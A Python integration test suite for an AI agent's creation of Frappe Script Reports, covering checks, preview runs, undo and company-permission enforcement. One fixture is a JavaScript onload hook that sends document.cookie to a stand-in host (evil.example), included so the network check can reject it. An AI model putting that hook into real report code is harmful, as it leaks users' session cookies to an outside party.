"""Report kind, Script Report (docs/customization/01 §3.1 v2): normalize, the checks, a real preview run,
execute + verify + undo, and the owner's case from references/reports.md §6 (multi-select Company, full company
names, company permissions respected)."""

import json
import os
import re
from unittest.mock import patch

import frappe
from frappe.tests import IntegrationTestCase

from ai_agent.customization.analyzers import python_code
from ai_agent.customization.contract import CustomizationError
from ai_agent.customization.kinds import _base
from ai_agent.customization.kinds.report import KIND, js_filters
from ai_agent.runtime.skill_registry import SKILLS_DIR

ADMIN = "Administrator"
SM_ONLY = "ai-customize-sr-sm-only@example.com"
RESTRICTED = "ai-customize-sr-one-company@example.com"
EXAMPLE_NAME = "Sales per Company (AI example)"
SIMPLE = 'columns = [{"fieldname": "name", "label": "Name", "fieldtype": "Data"}]\nrows = frappe.get_list("ToDo", fields=["name"], limit=3)\ndata = [columns, rows]\n'


def critical(report):
	return {c.code for c in report.critical()}


def codes(report, level):
	return {c.code for c in report.checks if c.level == level}


def worked_example():
	"""(python, javascript) of the worked example in references/reports.md §6."""
	with open(os.path.join(SKILLS_DIR, "customization", "references", "reports.md"), encoding="utf-8") as handle:
		text = handle.read()
	section = text[text.index("### Worked example"):]
	python = re.search(r"```python script-report\n(.*?)\n```", section, re.S).group(1)
	javascript = re.search(r"```js\n(.*?)\n```", section, re.S).group(1)
	return python, javascript


def companies_with_invoices():
	rows = frappe.get_all("Sales Invoice", filters={"docstatus": 1}, fields=["company", {"COUNT": "*", "as": "n"}],
		group_by="company", order_by="company asc")
	return [r.company for r in rows if r.n]


class TestCustomizeScriptReport(IntegrationTestCase):
	def setUp(self):
		frappe.set_user(ADMIN)
		self.suffix = frappe.generate_hash(length=6)

	def track(self, name):
		def remove():
			frappe.set_user(ADMIN)
			if frappe.db.exists("Report", name):
				frappe.delete_doc("Report", name, force=True, ignore_permissions=True)

		self.addCleanup(remove)
		return name

	def args(self, name, script=SIMPLE, **extra):
		return {"operation": "create", "report_name": name, "ref_doctype": "ToDo", "report_type": "Script Report",
			"report_script": script, "purpose": "test script report", **extra}

	def js(self, name, filters='{fieldname: "status", label: "Status", fieldtype: "Select", options: "\\nOpen\\nClosed"}'):
		return f'frappe.query_reports["{name}"] = {{\n\tfilters: [{filters}],\n}};\n'

	# -- the owner's case --------------------------------------------------------------
	def test_worked_example_create_run_update_undo(self):
		if not frappe.db.exists("DocType", "Sales Invoice"):
			self.skipTest("ERPNext is not installed")
		python, javascript = worked_example()
		name = self.track(f"{EXAMPLE_NAME} {self.suffix}")
		javascript = javascript.replace(EXAMPLE_NAME, name)
		company = (companies_with_invoices() or frappe.get_all("Company", pluck="name", limit=1))[0]
		spec = KIND.normalize({"operation": "create", "report_name": name, "ref_doctype": "Sales Invoice",
			"report_type": "Script Report", "purpose": "Net sales per chosen company", "report_script": python,
			"javascript": javascript, "roles": ["Accounts Manager", "Accounts User"],
			"sample_filters": {"company": [company], "from_date": "2000-01-01", "to_date": "2100-12-31"}}, ADMIN)
		self.assertEqual(KIND.roles_for(spec), ("System Manager", "Script Manager"))
		self.assertTrue(spec["report_script"].startswith("# ai_agent: "))
		self.assertTrue(spec["javascript"].startswith("// ai_agent: "))
		report = KIND.check(spec, ADMIN)
		self.assertFalse(report.critical(), [c.message for c in report.critical()])
		self.assertIn("report.preview", codes(report, "ok"))
		self.assertNotIn("report.multiselect_permission", codes(report, "warning"))
		self.assertEqual(report.preview["rows"]["columns"], ["company", "company_name", "invoices", "net_sales"])
		self.assertEqual({r["company"] for r in report.preview["rows"]["rows"]} - {company}, set())
		filters = {f["fieldname"]: f for f in report.preview["filters"]}
		self.assertEqual(filters["company"]["fieldtype"], "MultiSelectList")
		self.assertEqual(report.preview["javascript"]["language"], "javascript")
		json.dumps(report.to_dict())  # stored in the approval payload

		result = KIND.execute(spec, ADMIN)
		verify = KIND.verify(spec, result)
		self.assertFalse([c for c in verify if c.level == "critical"], [c.message for c in verify])
		doc = frappe.get_doc("Report", name)
		self.assertEqual((doc.is_standard, doc.report_type, doc.ref_doctype), ("No", "Script Report", "Sales Invoice"))
		self.assertIn(f'frappe.query_reports["{name}"]', doc.javascript)

		# Frappe itself serves our filters and runs the report
		from frappe.desk.query_report import get_script, run

		self.assertIn("MultiSelectList", get_script(name)["script"])
		out = run(name, filters={"company": [company], "from_date": "2000-01-01", "to_date": "2100-12-31"})
		self.assertEqual([c["fieldname"] for c in out["columns"]], ["company", "company_name", "invoices", "net_sales"])
		for row in out["result"]:
			if isinstance(row, dict) and row.get("company"):
				self.assertEqual(row["company_name"], frappe.db.get_value("Company", row["company"], "company_name"))

		update = KIND.normalize({"operation": "update", "report_name": name,
			"report_script": python.replace('_("Net Sales")', '_("Net Sales (base)")')}, ADMIN)
		report = KIND.check(update, ADMIN)
		self.assertFalse(report.critical(), [c.message for c in report.critical()])
		self.assertIn('+    {"fieldname": "net_sales", "label": _("Net Sales (base)")', report.preview["code"]["diff"])
		result = KIND.execute(update, ADMIN)
		self.assertIn("Net Sales (base)", frappe.db.get_value("Report", name, "report_script"))
		self.assertEqual(result["undo"]["operation"], "update")
		KIND.execute(KIND.normalize(result["undo"], ADMIN), ADMIN)
		self.assertNotIn("Net Sales (base)", frappe.db.get_value("Report", name, "report_script"))

		self.assertEqual(KIND.execute(KIND.normalize({"operation": "disable", "report_name": name}, ADMIN), ADMIN)["undo"],
			{"operation": "enable", "report_name": name})
		self.assertEqual(frappe.db.get_value("Report", name, "disabled"), 1)

	def test_worked_example_respects_company_permissions(self):
		if not frappe.db.exists("DocType", "Sales Invoice"):
			self.skipTest("ERPNext is not installed")
		with_invoices = companies_with_invoices()
		all_companies = frappe.get_all("Company", pluck="name", order_by="name asc")
		if not with_invoices or len(all_companies) < 2:
			self.skipTest("needs two companies and a submitted Sales Invoice")
		hidden = with_invoices[0]  # a company that has invoices, which the user may not see
		allowed = next(c for c in all_companies if c != hidden)
		if not frappe.db.exists("User", RESTRICTED):
			frappe.get_doc({"doctype": "User", "email": RESTRICTED, "first_name": "One company", "send_welcome_email": 0}).insert(ignore_permissions=True)
		user = frappe.get_doc("User", RESTRICTED)
		user.add_roles("Accounts User")
		frappe.db.delete("User Permission", {"user": RESTRICTED})
		frappe.get_doc({"doctype": "User Permission", "user": RESTRICTED, "allow": "Company", "for_value": allowed,
			"apply_to_all_doctypes": 1}).insert(ignore_permissions=True)
		self.addCleanup(frappe.db.delete, "User Permission", {"user": RESTRICTED})
		frappe.clear_cache(user=RESTRICTED)

		python, _js = worked_example()
		# the user asks for both companies: the hidden one is dropped, and nothing of it is read
		with _base.as_user(RESTRICTED):
			out = python_code.run_report_script(python, {"company": [hidden, allowed]})
		columns, rows = out["data"]
		self.assertEqual([c["fieldname"] for c in columns], ["company", "company_name", "invoices", "net_sales"])
		self.assertNotIn(hidden, {r["company"] for r in rows})
		self.assertEqual({r["company"] for r in rows} - {allowed}, set())
		# no filter = every company the user may see, still not the hidden one
		with _base.as_user(RESTRICTED):
			out = python_code.run_report_script(python, {})
		self.assertNotIn(hidden, {r["company"] for r in out["data"][1]})
		# as Administrator the same request shows the hidden company's invoices
		out = python_code.run_report_script(python, {"company": [hidden]})
		self.assertIn(hidden, {r["company"] for r in out["data"][1]})

	def test_multiselect_without_permission_filter_warns(self):
		name = f"AI SR Multi {self.suffix}"
		script = ('chosen = filters.get("company") or []\ncolumns = [{"fieldname": "name", "label": "Name", "fieldtype": "Data"}]\n'
			'data = [columns, frappe.get_list("ToDo", fields=["name"], limit=2)]\n')
		spec = KIND.normalize(self.args(name, script, javascript=self.js(name,
			'{fieldname: "company", label: "Company", fieldtype: "MultiSelectList", options: "Company", '
			'get_data: (txt) => frappe.db.get_link_options("Company", txt)}')), ADMIN)
		report = KIND.check(spec, ADMIN)
		self.assertFalse(report.critical(), [c.message for c in report.critical()])
		self.assertIn("report.multiselect_permission", codes(report, "warning"))
		self.assertIsInstance(report.preview["sample_filters"]["company"], list)

	# -- checks ------------------------------------------------------------------------
	def test_critical_checks(self):
		cases = [
			("import json\ndata = [[], []]\n", None, "py.import"),
			("x = 1\n", None, "py.report_output"),
			("rows = frappe.db.sql('select 1')\ndata = [[], rows]\n", None, "py.identity"),
			('columns = [{"fieldname": "a", "label": "A", "fieldtype": "Int"}]\nrows = [{"a": 1 / 0}]\ndata = [columns, rows]\n', None, "report.preview"),
			("data = 5\n", None, "report.output"),
			('result = [{"a": 1}]\n', None, "report.columns"),
			(SIMPLE, 'frappe.query_reports["Another Report"] = {filters: []};', "report.js_target"),
			(SIMPLE, 'frappe.query_reports["{name}"] = {filters: [ {fieldname: "a" ];', "js.syntax"),
			(SIMPLE, 'frappe.query_reports["{name}"] = {onload() { fetch("https://evil.example/?" + document.cookie); }};', "js.network"),
		]
		for script, javascript, code in cases:
			with self.subTest(code=code):
				name = f"AI SR Bad {self.suffix}"
				extra = {"javascript": javascript.replace("{name}", name)} if javascript else {}
				spec = KIND.normalize(self.args(name, script, **extra), ADMIN)
				self.assertIn(code, critical(KIND.check(spec, ADMIN)))

	def test_preconditions_are_critical(self):
		spec = KIND.normalize(self.args(f"AI SR Pre {self.suffix}"), ADMIN)
		with patch("ai_agent.customization.kinds.server_script.server_scripts_enabled", return_value=False):
			report = KIND.check(spec, ADMIN)
		self.assertIn("script.server_scripts_disabled", critical(report))
		self.assertNotIn("rows", report.preview)  # nothing was run
		if not frappe.db.exists("User", SM_ONLY):
			user = frappe.get_doc({"doctype": "User", "email": SM_ONLY, "first_name": "SM only", "send_welcome_email": 0})
			user.insert(ignore_permissions=True)
			user.add_roles("System Manager")
		frappe.db.delete("Has Role", {"parent": SM_ONLY, "role": "Script Manager"})
		self.assertIn("roles.missing", critical(KIND.check(spec, SM_ONLY)))
		existing = frappe.get_all("Report", filters={"report_type": "Script Report"}, pluck="name", limit=1)
		if existing:
			taken = KIND.normalize(self.args(existing[0]), ADMIN)
			self.assertIn("report.name_taken", critical(KIND.check(taken, ADMIN)))

	def test_warnings(self):
		name = f"AI SR Warn {self.suffix}"
		script = ('status = filters.get("status")\nowner = filters.get("owner_email")\n'
			'rows = frappe.get_all("ToDo", fields=["name"], limit=2)\n'
			'columns = [{"fieldname": "name", "label": "Name", "fieldtype": "Data"}]\ndata = [columns, rows]\n')
		report = KIND.check(KIND.normalize(self.args(name, script, javascript=self.js(name)), ADMIN), ADMIN)
		self.assertFalse(report.critical(), [c.message for c in report.critical()])
		warnings = codes(report, "warning")
		self.assertIn("py.unchecked_read", warnings)
		self.assertIn("report.filter_undeclared", warnings)
		throw = 'frappe.throw("Choose a status")\ndata = [[], []]\n'
		self.assertIn("report.preview_throw", codes(KIND.check(KIND.normalize(self.args(name, throw), ADMIN), ADMIN), "warning"))

	def test_result_with_columns_table_and_filters_table(self):
		name = self.track(f"AI SR Table {self.suffix}")
		script = 'result = frappe.get_list("ToDo", filters={"status": filters.get("status") or "Open"}, fields=["name", "status"], limit=3)\n'
		spec = KIND.normalize(self.args(name, script,
			filters=[{"fieldname": "status", "label": "Status", "fieldtype": "Select", "options": "Open\nClosed", "default": "Open"}],
			columns=[{"fieldname": "name", "label": "ToDo", "fieldtype": "Link", "options": "ToDo"},
				{"fieldname": "status", "label": "Status", "fieldtype": "Data"}]), ADMIN)
		report = KIND.check(spec, ADMIN)
		self.assertFalse(report.critical(), [c.message for c in report.critical()])
		self.assertEqual(report.preview["rows"]["columns"], ["name", "status"])
		self.assertEqual(report.preview["sample_filters"], {"status": "Open"})
		result = KIND.execute(spec, ADMIN)
		self.assertFalse([c for c in KIND.verify(spec, result) if c.level == "critical"])
		self.assertEqual(result["undo"], {"operation": "disable", "report_name": name})
		self.assertEqual(KIND.get_source(name, ADMIN)["report_script"], frappe.db.get_value("Report", name, "report_script"))

	def test_normalize_rules(self):
		name = f"AI SR Norm {self.suffix}"
		with self.assertRaises(CustomizationError):  # report_script is required
			KIND.normalize({**self.args(name), "report_script": ""}, ADMIN)
		with self.assertRaises(CustomizationError):  # code keys belong to Script Reports
			KIND.normalize({"operation": "create", "report_name": name, "ref_doctype": "ToDo", "report_type": "Query Report",
				"query": "select name from `tabToDo`", "report_script": SIMPLE}, ADMIN)
		with self.assertRaises(CustomizationError):  # javascript and a filters table
			KIND.normalize(self.args(name, javascript=self.js(name),
				filters=[{"fieldname": "status", "label": "Status", "fieldtype": "Data"}]), ADMIN)
		with self.assertRaises(CustomizationError):  # a query is not a Script Report argument
			KIND.normalize(self.args(name, query="select 1"), ADMIN)
		with self.assertRaises(CustomizationError):
			KIND.normalize(self.args(name, unknown=1), ADMIN)
		self.assertEqual([f["fieldname"] for f in js_filters(self.js(name))], ["status"])
